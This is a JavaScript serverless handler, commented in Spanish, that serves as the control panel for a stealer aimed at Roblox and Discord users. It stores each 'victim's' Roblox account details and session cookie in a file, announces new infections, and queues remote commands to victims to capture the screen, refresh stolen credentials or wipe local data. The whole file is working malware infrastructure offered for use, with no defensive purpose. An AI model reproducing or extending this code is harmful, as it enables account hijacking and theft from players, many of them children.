// api/session.js - Bot para Session App
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    // ============================================
    // RECIBIR COMANDOS DESDE SESSION
    // ============================================
    if (req.method === 'POST' && req.body?.comando) {
        const { comando, userId } = req.body;
        
        // Leer datos de la víctima
        let victimData = {};
        try {
            const fs = require('fs');
            if (fs.existsSync('/tmp/victims.json')) {
                const victims = JSON.parse(fs.readFileSync('/tmp/victims.json', 'utf8'));
                victimData = victims[userId] || {};
            }
        } catch {}
        
        const r = victimData.roblox || {};
        let respuesta = '';
        
        switch(comando.toUpperCase()) {
            case 'ROBLOX':
                respuesta = `||@here||
🔔 **ROBLOX**

👤 Usuario: ${r.username || 'No disponible'}
🆔 ID: ${r.userId || 'No disponible'}
💰 Robux: ${r.robux || 0}
⭐ Seguidores: ${r.seguidores || 0}
👥 Amigos: ${r.amigos || 0}
💱 Premium: ${r.premium || 'No'}
🔰 Verificado: ${r.verified || 'No'}

💼 **Inventario:**
Headless: \`${r.headless || 'No'}\`
Korblox: \`${r.korblox || 'No'}\`

🌍 País: \`${victimData.pais || 'Desconocido'}\`
📅 Fecha: \`${victimData.fecha || ''}\`
⏰ Hora: \`${victimData.hora || ''}\`

🍪 Cookie:
\`\`\`${victimData.cookie || 'No disponible'}\`\`\``;
                break;
                
            case 'DISCORD':
                respuesta = `||@here||
🔔 **DISCORD**

👤 Usuario: (No disponible)
🆔 ID: (No disponible)
👥 Amigos: (No disponible)
💱 Nitro: (No disponible)

🌍 País: \`${victimData.pais || 'Desconocido'}\`
📅 Fecha: \`${victimData.fecha || ''}\`
⏰ Hora: \`${victimData.hora || ''}\`

✨ Token: No disponible`;
                break;
                
            case 'CAPTURA':
                if (!global.commands) global.commands = {};
                if (!global.commands[userId]) global.commands[userId] = [];
                global.commands[userId].push({ action: 'capturar_pantalla' });
                respuesta = `✅ Orden CAPTURA enviada a la víctima.`;
                break;
                
            case 'ACTUALIZAR':
                if (!global.commands) global.commands = {};
                if (!global.commands[userId]) global.commands[userId] = [];
                global.commands[userId].push({ action: 'actualizar_credenciales' });
                respuesta = `✅ Orden ACTUALIZAR enviada a la víctima.`;
                break;
                
            case 'LIMPIAR':
                if (!global.commands) global.commands = {};
                if (!global.commands[userId]) global.commands[userId] = [];
                global.commands[userId].push({ action: 'limpiar_datos' });
                respuesta = `✅ Orden LIMPIAR enviada a la víctima.`;
                break;
                
            default:
                respuesta = `❌ Comando no reconocido.
Usá: ROBLOX, DISCORD, CAPTURA, ACTUALIZAR, LIMPIAR`;
        }
        
        return res.status(200).json({ respuesta });
    }
    
    // ============================================
    // RECIBIR DATOS DE LA VÍCTIMA (desde log.js)
    // ============================================
    const { userId, victimData } = req.body;
    
    if (!userId || !victimData) {
        return res.status(400).json({ error: 'Faltan datos' });
    }
    
    // Guardar en /tmp
    try {
        const fs = require('fs');
        let victims = {};
        if (fs.existsSync('/tmp/victims.json')) {
            victims = JSON.parse(fs.readFileSync('/tmp/victims.json', 'utf8'));
        }
        victims[userId] = victimData;
        fs.writeFileSync('/tmp/victims.json', JSON.stringify(victims));
    } catch {}
    
    const r = victimData.roblox || {};
    
    // Mensaje principal CON EL FORMATO EXACTO QUE PEDISTE
    const mensaje = `🔔 **¡ Nueva Entrada !**

📋 **Comandos disponibles:**

ROBLOX     - Ver todos los datos
DISCORD    - Ver Discord
CAPTURA    - Tomar captura
ACTUALIZAR - Actualizar credenciales
LIMPIAR    - Limpiar datos locales

(ID: ${userId})`;
    
    res.status(200).json({ 
        status: 'ok', 
        mensaje,
        userId 
    });
}